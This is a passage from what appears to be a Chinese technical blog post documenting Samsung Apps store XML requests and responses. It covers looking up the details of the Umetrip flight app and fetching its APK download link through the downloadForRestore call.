<span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"productDetailMain"</span> <span class="attr">id</span>=<span class="string">"2280"</span> <span class="attr">numParam</span>=<span class="string">"9"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"srchClickURL"</span>&gt;</span>|@sn=SAPS|@qh=6b0d84489ac5bb5e9ec6c0332a43bfa0|@qid=SAPS.ODC.SRCH.CJK|@q=民航|@idx=0|@tot=13|@doc=000000607315test0astor00035|@title=航旅纵横<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"orderID"</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"stduk"</span>&gt;</span>7996060c3072254b08e62e7e35efdc71fbb8a4092039fb27ac47cf693f4587c1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"source"</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imei"</span>&gt;</span>990004393474345<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"unifiedPaymentYN"</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productImgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productImgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2280"</span> <span class="attr">name</span>=<span class="string">"productDetailMain"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">startNum</span>=<span class="string">"1"</span> <span class="attr">endNum</span>=<span class="string">"1"</span> <span class="attr">totalCount</span>=<span class="string">"1"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"81"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID"</span>&gt;</span>G000028478<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"needToLogin"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productImgUrl"</span>&gt;</span>http://img.samsungapps.com/productNew/000000607315/IconImage_20160826132045350_NEW_WEB_ICON_135_135.png<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"panelImgUrl"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"alreadyPurchased"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"purchasedMethod"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"orderID"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"orderItemSeq"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"averageRating"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"ratingParticipants"</span>&gt;</span>104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"myRatingYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"myCmtYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerID"</span>&gt;</span>3ehgzozhzt<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerName"</span>&gt;</span>China TravelSky Holding Company<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerBrandName"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"currencyUnit"</span>&gt;</span>元<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellingPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"reducePrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountFlag"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"restrictedAge"</span>&gt;</span>0+<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bundleYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"creditcardYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"phonebillYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"pSmsPurchaseYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"optBillYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"optBillList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPhoneBillYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"testPSMSPurchaseYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"mobileWalletSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"cyberCash"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"prepaidCardList"</span>&gt;</span>China Mobile@SASCNCSN01@http://www.chinamobileltd.com/@1;China Unicom@SASCNCSN01@http://www.chinaunicom.com/@2;China Telecom@SASCNCSN01@http://www.chinatelecom.com.cn/@3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"aliPay"</span>&gt;</span>Alipay paymentTypeID|6mztkyy858/CAC@SASCNCAP01@https://www.alipay.com<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"trialYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryPath"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryPath2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"version"</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"versionCode"</span>&gt;</span>109<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>application<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"loadType"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"edgeAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"realContentsSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"phonebillPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPhoneBillPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"compatibleOS"</span>&gt;</span>16<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"compatibleMaxOS"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tgtSDKVersion"</span>&gt;</span>22<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"nameAuthYN"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"validDate"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalTermArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalPriceArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalPhonebillPriceArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tnbYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"wishListYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"wishListId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"valuePackDispYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"valuePackPrmId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"multipleDeviceNCount"</span>&gt;</span>0/10<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"likeCount"</span>&gt;</span>265<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bGearVersion"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppMasterInfo"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"gearWatchFaceYN"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"IAPSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"newProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountType"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"spotLightId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"curationYn"</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"giftsTagYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"capIdList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"shortDescription"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post https://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"downloadForRestore"</span> <span class="attr">id</span>=<span class="string">"2316"</span> <span class="attr">numParam</span>=<span class="string">"6"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"predeployed"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"stduk"</span>&gt;</span>7996060c3072254b08e62e7e35efdc71fbb8a4092039fb27ac47cf693f4587c1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imei"</span>&gt;</span>990004393474345<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"autoUpdateYN"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"downloadType"</span>&gt;</span>new<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2316"</span> <span class="attr">name</span>=<span class="string">"downloadForRestore"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>&gt;</span>success<span class="tag">&lt;/<span class="name">errorString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"downLoadURI"</span>&gt;</span>http://cdnet-dn.gw.samsungapps.com/astore_bin/3ehgzozhzt/2016/0824/App_20160824114025329.apk?ctnt_id=000000607315&amp;amp;bsize=19925480&amp;amp;px-time=1474171361&amp;amp;px-hash=8151b80e26311a708ed7a37a479b45a4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentsSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"deltaDownloadURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"deltaContentsSize"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installedBinaryHashValue"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"updateBinaryHashValue"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"signature"</span>&gt;</span>125-71-7912112-100109-102-765995-12564-9428-93231161-111-1166059-11712-107-3682-1006175971062715-94-336650-9194-124-11026-219577-23-38116127-107350-12550100-2979-306539-343723-75-78121-3311610279-5-8728-19687045103-38-6563-63113-20-55-1414-10-112-77761710967-3569-99-60-46796229-49-1352-5889-121-53-7-7710120-3960-34107-27912910598-2138-30<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"gSignatureDownloadURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
